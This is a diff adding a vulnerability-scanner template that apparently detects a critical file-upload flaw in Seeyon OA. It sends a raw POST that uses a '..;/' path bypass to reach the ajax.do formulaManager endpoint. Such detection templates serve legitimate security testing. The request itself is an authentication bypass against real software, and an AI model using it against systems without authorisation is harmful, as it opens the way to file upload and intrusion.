@@ -1,0 +1,20 @@
+id: seeyon-ajaxaction-file-upload
+info:
+  name: Seeyon AjaxAction File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+http:
+  - raw:
+      - |
+        POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        managerMethod=toString
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "com.seeyon.ctp.common.formula.manager.FormulaManagerImpl"
